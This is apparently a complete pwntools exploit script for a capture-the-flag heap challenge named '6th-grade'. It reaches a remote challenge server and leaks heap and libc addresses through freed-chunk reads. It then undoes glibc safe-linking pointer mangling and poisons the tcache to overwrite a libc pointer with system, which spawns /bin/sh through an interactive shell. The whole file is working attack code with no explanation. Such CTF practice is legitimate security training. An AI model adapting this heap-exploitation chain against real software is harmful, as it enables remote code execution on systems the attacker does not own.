from pwn import *
from z3 import *

libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
p = None
def connect():
    if args.GDB:
        p = gdb.debug("./6th-grade", gdbscript="c")
    elif args.REMOTE:
        p = remote("0.cloud.chals.io", 28840)
        # p = remote("localhost", 1234)
    else:
        p = process("./6th-grade")
    return p

def make(index, size):
    p.sendlineafter(b":", b"1")
    p.sendlineafter(b"?", str(index).encode())
    p.sendlineafter(b"?", str(size).encode())

def edit(index, data):
    p.sendlineafter(b":", b"2")
    p.sendlineafter(b"?", str(index).encode())
    p.sendafter(b"?", data)

def free(index):
    p.sendlineafter(b":", b"3")
    p.sendlineafter(b"?", str(index).encode())

def view(index):
    p.sendlineafter(b":", b"4")
    p.sendlineafter(b"?", str(index).encode())
    p.recvline()
    return p.recvline()[:-1]

"""
	puts("The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,");
	puts("because of the 12bit sliding.");
	puts("And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)");
	long key = 0;
	long plain;

	for(int i=1; i<6; i++) {
		int bits = 64-12*i;
		if(bits < 0) bits = 0;
		plain = ((cipher ^ key) >> bits) << bits;
		key = plain >> 12;
		printf("round %d:\n", i);
		printf("key:    %#016lx\n", key);
		printf("plain:  %#016lx\n", plain);
		printf("cipher: %#016lx\n\n", cipher);
	}
	return plain;
"""

def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64-12*i
        if bits < 0: bits = 0
        plain = (((cipher ^ key) >> bits) << bits) % (1 << 64)
        key = (plain >> 12) % (1 << 64)
    return plain

def exploit(offset):
    global p
    make(0, 32-8)
    free(0)
    heap = u64(view(0).ljust(8, b"\x00"))
    heapbase = (heap - 1) << 12
    make(0, 32-8)
    log.info(f"heap: 0x{heap:x}")
    log.info(f"heapbase: 0x{heapbase:x}")

    for i in range(8):
        make(i, 0x100)
    make(8, 0)
    for i in range(8):
        free(i)
    leak = u64(view(7).ljust(8, b"\x00"))
    for i in range(8):
        make(i, 0x100)
    base = leak - 0x219ce0
    target = base + 0x00319098 - 0x100000 - 0x18
    log.info(f"leak: 0x{leak:x}")
    log.info(f"base: 0x{base:x}")
    log.info(f"target: 0x{target:x}")

    victim = heapbase + 0x23c0 - 0x50

    # make(0, 64 - 8)
    # make(1, 64 - 8)
    # free(1)
    # free(0)
    # leak = u64(view(0).ljust(8, b"\x00"))
    # log.info(f"leak: 0x{leak:x}")
    # make(0, 64 - 8)
    # make(1, 64 - 8)

    # victim = decrypt(leak)
    log.info(f"victim: 0x{victim:x}")

    make(0, 64 - 8)
    make(1, 0x1000-8)
    make(2, 0x1000)
    data =  p64(victim) * 4
    data += p64(0) * 2
    data += p64(0x40)
    edit(0, data)
    free(1)

    make(16, 128 - 8)
    make(17, 128 - 8)
    free(17)
    free(16)
    edit(0, p64((victim >> 12) ^ target) + b"\n")
    make(18, 128 - 8)
    make(19, 128 - 8)
    edit(18, b"/bin/sh\x00\n")

    edit(19, p64(0) * 3 + p64(base + libc.sym.system) + b"\n")

    view(18)

    p.interactive()

p = connect()
exploit(0)